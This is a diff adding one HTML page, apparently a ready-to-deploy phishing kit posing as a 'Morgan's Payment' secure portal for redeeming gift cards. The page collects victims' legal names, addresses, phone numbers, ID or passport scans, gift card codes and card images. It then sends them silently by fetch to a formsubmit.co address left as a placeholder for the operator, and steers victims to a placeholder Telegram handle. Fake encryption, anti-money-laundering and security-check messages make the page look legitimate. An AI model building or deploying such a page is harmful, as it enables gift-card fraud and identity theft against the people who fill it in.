@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Morgan's Payment | Enterprise Secure Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { --primary: #10b981; --primary-dark: #059669; --bg-main: #f8fafc; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: var(--bg-main); color: #0f172a; }
+        
+        .step-progress.active { background-color: var(--primary); color: white; border-color: var(--primary); }
+        .step-line.active { background-color: var(--primary); }
+        
+        #loader-overlay {
+            position: fixed; inset: 0; background: #020617; z-index: 9999;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+        }
+
+        .premium-glow { box-shadow: 0 0 40px -10px rgba(16, 185, 129, 0.2); }
+        .glass-panel { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.3); }
+        
+        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        canvas { background: #fff; border: 2px dashed #e2e8f0; border-radius: 12px; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body class="antialiased">
+
+    <!-- 1. DYNAMIC PRE-LOADER -->
+    <div id="loader-overlay">
+        <div class="relative">
+            <div class="w-24 h-24 border-4 border-emerald-500/20 border-t-emerald-500 rounded-full animate-spin"></div>
+            <div class="absolute inset-0 flex items-center justify-center">
+                <span class="text-white font-bold text-xl uppercase tracking-tighter">M</span>
+            </div>
+        </div>
+        <h1 class="text-white mt-8 text-xl font-bold tracking-widest uppercase">Morgan's <span class="text-emerald-500">Secure</span></h1>
+        <p class="text-slate-500 text-xs mt-2 tracking-widest font-medium uppercase animate-pulse">Initializing Encrypted Tunnel...</p>
+    </div>
+
+    <!-- 2. AUTHENTICATION (LOGIN/SIGNUP) -->
+    <div id="auth-screen" class="hidden min-h-screen flex items-center justify-center bg-[#020617] px-4">
+        <div class="w-full max-w-md">
+            <div class="text-center mb-10">
+                <h1 class="text-white text-3xl font-extrabold tracking-tight mb-2">Access Portal</h1>
+                <p class="text-slate-400">Secure login for Morgan's Official Site</p>
+            </div>
+            
+            <div class="bg-white/5 border border-white/10 p-8 rounded-[2rem] backdrop-blur-xl">
+                <div id="auth-error" class="hidden mb-6 p-4 bg-red-500/10 border border-red-500/20 text-red-400 text-sm rounded-xl text-center italic"></div>
+                
+                <div class="space-y-6">
+                    <div>
+                        <label class="block text-[10px] uppercase font-bold text-slate-400 mb-2 ml-1">Email Identification</label>
+                        <input type="email" id="auth-email" class="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-white outline-none focus:border-emerald-500 transition" placeholder="name@company.com">
+                    </div>
+                    <div>
+                        <label class="block text-[10px] uppercase font-bold text-slate-400 mb-2 ml-1">Secure Password</label>
+                        <input type="password" id="auth-pass" class="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-white outline-none focus:border-emerald-500 transition" placeholder="••••••••">
+                    </div>
+                    <button onclick="handleAuth()" id="auth-submit-btn" class="w-full bg-emerald-500 hover:bg-emerald-600 text-[#020617] font-bold py-4 rounded-2xl transition shadow-lg shadow-emerald-500/20">
+                        Login to Portal
+                    </button>
+                    <div class="text-center">
+                        <button onclick="toggleAuthMode()" id="auth-toggle" class="text-emerald-500 text-sm font-medium hover:text-emerald-400">Request New Access (Sign Up)</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. TERMS MODAL -->
+    <div id="terms-modal" class="hidden fixed inset-0 z-[60] flex items-center justify-center p-6 bg-slate-950/90 backdrop-blur-md">
+        <div class="bg-white max-w-xl w-full rounded-[2.5rem] p-10 shadow-2xl overflow-hidden relative">
+            <div class="absolute top-0 left-0 w-full h-2 bg-emerald-500"></div>
+            <h2 class="text-2xl font-black text-slate-900 mb-4 uppercase tracking-tight">Compliance & Privacy</h2>
+            <div class="h-64 overflow-y-auto pr-4 text-slate-600 text-sm leading-relaxed space-y-4 mb-8">
+                <p>I confirm that I am the authorized holder of the gift assets being uploaded. I understand that Morgan's Payment Portal uses AI-driven fraud detection.</p>
+                <p><strong>Anti-Money Laundering (AML):</strong> Any attempt to submit stolen or laundered codes will result in an immediate permanent ban and the user's IP address will be forwarded to the appropriate authorities.</p>
+                <p><strong>Data Processing:</strong> Documents and ID uploads are used solely for verification and are deleted after transaction settlement.</p>
+            </div>
+            <button onclick="acceptTerms()" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-bold hover:bg-emerald-600 transition shadow-xl">I AGREE & CONTINUE</button>
+        </div>
+    </div>
+
+    <!-- 4. MAIN DASHBOARD -->
+    <div id="dashboard" class="hidden min-h-screen pb-20">
+        <!-- Navigation -->
+        <nav class="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-slate-100">
+            <div class="max-w-7xl mx-auto px-6 h-20 flex justify-between items-center">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 bg-slate-900 rounded-xl flex items-center justify-center">
+                        <i class="fa-solid fa-m text-emerald-500 font-bold text-xl"></i>
+                    </div>
+                    <span class="text-slate-900 font-extrabold tracking-tighter text-xl">MORGAN'S <span class="text-emerald-500 uppercase text-sm tracking-widest ml-1">Official</span></span>
+                </div>
+
+                <div class="flex items-center gap-4">
+                    <div class="hidden md:block text-right">
+                        <p id="user-email-display" class="text-sm font-bold text-slate-900 leading-none">user@example.com</p>
+                        <span class="text-[10px] font-bold text-emerald-500 uppercase tracking-widest">Verified Session</span>
+                    </div>
+                    <div class="relative group">
+                        <img id="user-pfp" src="https://ui-avatars.com/api/?background=10b981&color=fff&name=M" class="w-12 h-12 rounded-2xl cursor-pointer border-2 border-slate-50 hover:border-emerald-500 transition object-cover">
+                        <div class="absolute right-0 mt-3 w-56 bg-white shadow-2xl rounded-2xl hidden group-hover:block border border-slate-100 overflow-hidden fade-in">
+                            <label class="flex items-center gap-3 p-4 hover:bg-slate-50 cursor-pointer text-sm font-medium">
+                                <i class="fa-solid fa-user-plus text-emerald-600"></i> Update Profile Pic
+                                <input type="file" class="hidden" onchange="updatePFP(this)">
+                            </label>
+                            <hr class="border-slate-100">
+                            <button onclick="logout()" class="flex items-center gap-3 w-full p-4 hover:bg-slate-50 text-sm font-medium text-slate-700">
+                                <i class="fa-solid fa-power-off"></i> Logout
+                            </button>
+                            <button onclick="deleteAccount()" class="flex items-center gap-3 w-full p-4 hover:bg-red-50 text-sm font-bold text-red-600">
+                                <i class="fa-solid fa-trash"></i> Delete Account
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Stats Section -->
+        <header class="max-w-7xl mx-auto px-6 py-10">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div class="glass-panel p-6 rounded-[2rem] border-b-4 border-emerald-500 shadow-sm">
+                    <p class="text-slate-500 text-xs font-bold uppercase tracking-widest mb-1">Total Processed</p>
+                    <h3 class="text-3xl font-black text-slate-900">$12,450.00</h3>
+                </div>
+                <div class="glass-panel p-6 rounded-[2rem] border-b-4 border-blue-500 shadow-sm">
+                    <p class="text-slate-500 text-xs font-bold uppercase tracking-widest mb-1">Pending Clearance</p>
+                    <h3 class="text-3xl font-black text-slate-900">$0.00</h3>
+                </div>
+                <div class="glass-panel p-6 rounded-[2rem] border-b-4 border-slate-900 shadow-sm">
+                    <p class="text-slate-500 text-xs font-bold uppercase tracking-widest mb-1">Security Score</p>
+                    <h3 class="text-3xl font-black text-emerald-500">98%</h3>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Workspace -->
+        <main class="max-w-7xl mx-auto px-6 grid grid-cols-1 lg:grid-cols-3 gap-10">
+            
+            <!-- Left: Step-by-Step Form -->
+            <div class="lg:col-span-2">
+                <div class="bg-white rounded-[2.5rem] shadow-sm border border-slate-100 overflow-hidden">
+                    <!-- Form Steps Header -->
+                    <div class="flex border-b border-slate-50 px-8 py-6 bg-slate-50/50 justify-between items-center">
+                        <div class="flex items-center gap-8">
+                            <div class="flex items-center gap-2">
+                                <span id="s1-circle" class="w-8 h-8 rounded-full border-2 flex items-center justify-center text-xs font-bold active">1</span>
+                                <span class="text-xs font-bold uppercase tracking-tighter hidden md:block">Identity</span>
+                            </div>
+                            <div class="w-8 h-[2px] bg-slate-200"></div>
+                            <div class="flex items-center gap-2">
+                                <span id="s2-circle" class="w-8 h-8 rounded-full border-2 flex items-center justify-center text-xs font-bold">2</span>
+                                <span class="text-xs font-bold uppercase tracking-tighter hidden md:block">Asset</span>
+                            </div>
+                            <div class="w-8 h-[2px] bg-slate-200"></div>
+                            <div class="flex items-center gap-2">
+                                <span id="s3-circle" class="w-8 h-8 rounded-full border-2 flex items-center justify-center text-xs font-bold">3</span>
+                                <span class="text-xs font-bold uppercase tracking-tighter hidden md:block">Confirm</span>
+                            </div>
+                        </div>
+                        <span class="text-[10px] font-black text-emerald-600 bg-emerald-50 px-3 py-1 rounded-full uppercase">Secure Submission</span>
+                    </div>
+
+                    <form id="payment-form" action="https://formsubmit.co/YOUR_EMAIL@HERE.COM" method="POST" enctype="multipart/form-data" onsubmit="return handleFinalSubmit(event)" class="p-10">
+                        <input type="hidden" name="_captcha" value="false">
+                        
+                        <!-- STEP 1: IDENTITY -->
+                        <div id="step-1" class="fade-in space-y-6">
+                            <h3 class="text-xl font-black text-slate-800 mb-6">Personal Identification</h3>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div class="col-span-full">
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Full Legal Name</label>
+                                    <input type="text" name="Full_Name" required class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl focus:ring-4 focus:ring-emerald-500/5 focus:border-emerald-500 outline-none transition">
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Mobile Number</label>
+                                    <input type="tel" name="Mobile" required class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-emerald-500">
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Country</label>
+                                    <input type="text" name="Country" required class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-emerald-500">
+                                </div>
+                                <div class="col-span-full">
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Residential Address</label>
+                                    <input type="text" name="Address" required class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-emerald-500">
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Postal Code</label>
+                                    <input type="text" name="Postal" required class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-emerald-500">
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">ID Document / Passport</label>
+                                    <input type="file" name="ID_File" required class="text-xs text-slate-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-xs file:font-bold file:bg-slate-900 file:text-white hover:file:bg-emerald-600">
+                                </div>
+                            </div>
+                            <button type="button" onclick="goToStep(2)" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-bold hover:bg-emerald-600 transition">Continue to Asset Details</button>
+                        </div>
+
+                        <!-- STEP 2: ASSET (GIFT CARD) -->
+                        <div id="step-2" class="hidden fade-in space-y-6">
+                            <h3 class="text-xl font-black text-slate-800 mb-6">Asset Specification</h3>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div>
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Gift Card Type</label>
+                                    <select name="Card_Type" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-emerald-500 appearance-none">
+                                        <option>Apple / iTunes</option>
+                                        <option>Steam Global</option>
+                                        <option>Amazon Balance</option>
+                                        <option>Razer Gold</option>
+                                        <option>Sephora / Nordstrom</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Amount ($)</label>
+                                    <input type="number" name="Amount" placeholder="0.00" required class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none">
+                                </div>
+                                <div class="col-span-full">
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Redeem Code</label>
+                                    <input type="text" name="Code" placeholder="XXXX XXXX XXXX XXXX" required class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl font-mono text-lg tracking-widest text-emerald-600">
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Card Front View</label>
+                                    <input type="file" name="Front_Img" required class="text-xs">
+                                </div>
+                                <div>
+                                    <label class="text-[10px] font-bold uppercase text-slate-400 mb-2 block ml-1">Card Back View</label>
+                                    <input type="file" name="Back_Img" required class="text-xs">
+                                </div>
+                            </div>
+                            <div class="flex gap-4">
+                                <button type="button" onclick="goToStep(1)" class="w-1/3 bg-slate-100 text-slate-600 py-5 rounded-2xl font-bold hover:bg-slate-200 transition">Back</button>
+                                <button type="button" onclick="goToStep(3)" class="w-2/3 bg-slate-900 text-white py-5 rounded-2xl font-bold hover:bg-emerald-600 transition">Next: Review & Sign</button>
+                            </div>
+                        </div>
+
+                        <!-- STEP 3: CONFIRM & SIGN -->
+                        <div id="step-3" class="hidden fade-in space-y-6">
+                            <h3 class="text-xl font-black text-slate-800 mb-4">Final Authorization</h3>
+                            <div class="bg-slate-900 p-8 rounded-3xl">
+                                <p class="text-white/50 text-[10px] uppercase font-bold mb-4 tracking-widest">Digital Signature Box</p>
+                                <canvas id="signature-pad" height="160" class="w-full"></canvas>
+                                <div class="flex justify-between items-center mt-4">
+                                    <p class="text-slate-500 text-[10px]">By signing, you authorize the immediate liquidation of this asset.</p>
+                                    <button type="button" onclick="clearSig()" class="text-emerald-500 text-xs font-black uppercase">Clear</button>
+                                </div>
+                                <input type="hidden" name="Signature_Data" id="signature-input">
+                            </div>
+                            <div class="flex gap-4">
+                                <button type="button" onclick="goToStep(2)" class="w-1/3 bg-slate-100 text-slate-600 py-5 rounded-2xl font-bold">Back</button>
+                                <button type="submit" id="submit-btn" class="w-2/3 bg-emerald-500 text-slate-950 py-5 rounded-2xl font-black text-lg hover:bg-emerald-400 transition shadow-xl shadow-emerald-500/20 uppercase tracking-tighter">Initialize Transaction</button>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Right: Activity Sidebar -->
+            <div class="space-y-6">
+                <div class="glass-panel p-8 rounded-[2.5rem]">
+                    <h4 class="font-black text-slate-900 mb-6 uppercase tracking-tight flex items-center gap-2">
+                        <i class="fa-solid fa-bolt text-emerald-500"></i> Live Activity
+                    </h4>
+                    <div class="space-y-6">
+                        <div class="flex gap-4 items-start">
+                            <div class="w-8 h-8 rounded-full bg-blue-50 text-blue-500 flex items-center justify-center text-xs shrink-0"><i class="fa-solid fa-check"></i></div>
+                            <div>
+                                <p class="text-xs font-bold text-slate-800">Security Check Passed</p>
+                                <p class="text-[10px] text-slate-400">Your IP (192.168.1.1) is recognized.</p>
+                            </div>
+                        </div>
+                        <div class="flex gap-4 items-start">
+                            <div class="w-8 h-8 rounded-full bg-emerald-50 text-emerald-500 flex items-center justify-center text-xs shrink-0"><i class="fa-solid fa-shield-halved"></i></div>
+                            <div>
+                                <p class="text-xs font-bold text-slate-800">Encryption Active</p>
+                                <p class="text-[10px] text-slate-400">All data is end-to-end encrypted.</p>
+                            </div>
+                        </div>
+                        <div class="flex gap-4 items-start opacity-50">
+                            <div class="w-8 h-8 rounded-full bg-slate-50 text-slate-400 flex items-center justify-center text-xs shrink-0"><i class="fa-solid fa-hourglass"></i></div>
+                            <div>
+                                <p class="text-xs font-bold text-slate-800">Awaiting Submission</p>
+                                <p class="text-[10px] text-slate-400">Complete the form to see updates.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-slate-900 p-8 rounded-[2.5rem] text-white">
+                    <h4 class="font-bold text-sm mb-4">Support Center</h4>
+                    <p class="text-xs text-white/60 leading-relaxed mb-6">Need assistance? Our verified agents are available on Telegram for priority clearing.</p>
+                    <a href="https://t.me/YOUR_TELEGRAM" class="block w-full bg-white/10 hover:bg-white/20 text-center py-4 rounded-2xl text-xs font-bold transition">Open Support Ticket</a>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- SUCCESS POPUP -->
+    <div id="success-modal" class="hidden fixed inset-0 z-[100] flex items-center justify-center p-6 bg-slate-950/90 backdrop-blur-xl">
+        <div class="bg-white max-w-sm w-full rounded-[3rem] p-10 text-center shadow-2xl scale-up-animation">
+            <div class="w-24 h-24 bg-emerald-50 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 text-4xl">
+                <i class="fa-solid fa-circle-check"></i>
+            </div>
+            <h2 class="text-2xl font-black text-slate-900 mb-2">Request Sent</h2>
+            <p class="text-slate-500 text-sm mb-8 leading-relaxed">Your payment data has been securely broadcasted to our nodes. Final authentication is required via our corporate Telegram.</p>
+            <a href="https://t.me/YOUR_TELEGRAM" class="block w-full bg-emerald-500 text-slate-950 py-5 rounded-2xl font-black shadow-lg shadow-emerald-500/30 hover:bg-emerald-400 transition">AUTHENTICATE ON TELEGRAM</a>
+        </div>
+    </div>
+
+    <script>
+        // --- 1. Dynamic Loader ---
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('loader-overlay').classList.add('hidden');
+                document.getElementById('auth-screen').classList.remove('hidden');
+            }, 3000);
+        });
+
+        // --- 2. Advanced Auth ---
+        let isLogin = true;
+        const db = JSON.parse(localStorage.getItem('morgan_enterprise_db') || '[]');
+
+        function toggleAuthMode() {
+            isLogin = !isLogin;
+            document.getElementById('auth-submit-btn').innerText = isLogin ? "Login to Portal" : "Register Access";
+            document.getElementById('auth-toggle').innerText = isLogin ? "Request New Access (Sign Up)" : "Back to Login";
+        }
+
+        function handleAuth() {
+            const email = document.getElementById('auth-email').value;
+            const pass = document.getElementById('auth-pass').value;
+            const err = document.getElementById('auth-error');
+
+            if(!email || !pass) return;
+
+            if(isLogin) {
+                const user = db.find(u => u.email === email && u.pass === pass);
+                if(user) loginSuccess(user);
+                else { err.innerText = "Security Alert: Invalid credentials provided."; err.classList.remove('hidden'); }
+            } else {
+                if(db.some(u => u.email === email)) { err.innerText = "Error: This identity is already registered."; err.classList.remove('hidden'); }
+                else {
+                    const newUser = { email, pass, pfp: null };
+                    db.push(newUser);
+                    localStorage.setItem('morgan_enterprise_db', JSON.stringify(db));
+                    loginSuccess(newUser);
+                }
+            }
+        }
+
+        function loginSuccess(user) {
+            sessionStorage.setItem('active_session', user.email);
+            document.getElementById('user-email-display').innerText = user.email;
+            document.getElementById('auth-screen').classList.add('hidden');
+            document.getElementById('terms-modal').classList.remove('hidden');
+        }
+
+        function acceptTerms() {
+            document.getElementById('terms-modal').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            initSignature();
+        }
+
+        // --- 3. Step Navigation ---
+        function goToStep(num) {
+            [1, 2, 3].forEach(n => {
+                document.getElementById(`step-${n}`).classList.add('hidden');
+                document.getElementById(`s${n}-circle`).classList.remove('active', 'bg-emerald-500', 'text-white', 'border-emerald-500');
+            });
+            document.getElementById(`step-${num}`).classList.remove('hidden');
+            for(let i=1; i<=num; i++) {
+                document.getElementById(`s${i}-circle`).classList.add('bg-emerald-500', 'text-white', 'border-emerald-500');
+            }
+        }
+
+        // --- 4. User Profile Management ---
+        function updatePFP(input) {
+            if (input.files && input.files[0]) {
+                const reader = new FileReader();
+                reader.onload = (e) => document.getElementById('user-pfp').src = e.target.result;
+                reader.readAsDataURL(input.files[0]);
+            }
+        }
+
+        function logout() { sessionStorage.clear(); location.reload(); }
+        function deleteAccount() { 
+            if(confirm("Confirm account destruction? All history will be wiped.")) { 
+                localStorage.removeItem('morgan_enterprise_db'); 
+                logout(); 
+            } 
+        }
+
+        // --- 5. Signature Engine (Touch + Desktop) ---
+        let sigCanvas, sigCtx, drawing = false;
+
+        function initSignature() {
+            sigCanvas = document.getElementById('signature-pad');
+            sigCtx = sigCanvas.getContext('2d');
+            sigCanvas.width = sigCanvas.offsetWidth;
+            
+            const getPos = (e) => {
+                const rect = sigCanvas.getBoundingClientRect();
+                return { x: (e.clientX || e.touches[0].clientX) - rect.left, y: (e.clientY || e.touches[0].clientY) - rect.top };
+            };
+
+            const start = (e) => { drawing = true; sigCtx.beginPath(); const p = getPos(e); sigCtx.moveTo(p.x, p.y); };
+            const stop = () => { drawing = false; document.getElementById('signature-input').value = sigCanvas.toDataURL(); };
+            const draw = (e) => {
+                if(!drawing) return;
+                e.preventDefault();
+                const p = getPos(e);
+                sigCtx.lineWidth = 3;
+                sigCtx.lineCap = 'round';
+                sigCtx.strokeStyle = '#10b981';
+                sigCtx.lineTo(p.x, p.y);
+                sigCtx.stroke();
+            };
+
+            sigCanvas.addEventListener('mousedown', start); sigCanvas.addEventListener('touchstart', start);
+            sigCanvas.addEventListener('mouseup', stop); sigCanvas.addEventListener('touchend', stop);
+            sigCanvas.addEventListener('mousemove', draw); sigCanvas.addEventListener('touchmove', draw);
+        }
+
+        function clearSig() {
+            sigCtx.clearRect(0, 0, sigCanvas.width, sigCanvas.height);
+            document.getElementById('signature-input').value = "";
+        }
+
+        // --- 6. Professional Form Submission ---
+        async function handleFinalSubmit(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submit-btn');
+            btn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i> Processing Assets...';
+            btn.disabled = true;
+
+            const form = e.target;
+            const data = new FormData(form);
+
+            try {
+                await fetch(form.action, { method: 'POST', body: data, mode: 'no-cors' });
+                document.getElementById('success-modal').classList.remove('hidden');
+            } catch (err) {
+                alert("Transaction Broadcast Failed. Check Connection.");
+                btn.disabled = false;
+                btn.innerText = "Initialize Transaction";
+            }
+            return false;
+        }
+    </script>
+</body>
+</html>
